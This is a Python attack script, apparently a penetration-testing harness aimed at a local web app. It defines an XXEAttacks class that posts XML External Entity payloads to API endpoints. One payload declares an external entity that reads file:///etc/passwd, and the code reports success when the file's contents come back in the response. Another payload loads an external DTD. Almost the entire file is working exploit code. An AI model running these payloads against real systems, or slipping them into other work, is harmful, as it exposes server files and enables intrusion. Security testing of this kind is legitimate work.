import logging
import requests


class XXEAttacks:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        
    def test_xxe_basic(self):
        payload = """<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://localhost:3000/any.xml">
        <comments><text>XXE Test</text></comments>"""
        
        headers = {"Content-Type": "application/xml"}
        try:
            response = self.session.post(
                f"{self.base_url}/api/Feedbacks", 
                data=payload,
                headers=headers
            )
            return {"status": "success" if response.status_code not in [400, 403] else "failed"}
        except Exception as e:
            return {"status": "failed", "error": str(e)}

    def run_all_xxe_attacks(self):
        payload = """<?xml version="1.0"?>
        <!DOCTYPE root [
        <!ENTITY test SYSTEM "file:///etc/passwd">
        ]>
        <root>&test;</root>
        """
        try:
            response = self.session.post(
                self.base_url + "/api/vulnerable_endpoint",
                data=payload.encode('utf-8'),  # Assurez-vous que payload est encodé en bytes
                headers={"Content-Type": "application/xml"}
            )
            if response.status_code == 200 and "root:" in response.text:
                logging.info("[+] XXE succeeded.")
                return {"status": "success", "details": response.text}
            else:
                logging.warning("[-] XXE failed.")
                return {"status": "failed", "details": response.text}
        except Exception as e:
            logging.error(f"XXE error: {str(e)}")
            return {"status": "failed", "error": str(e)}
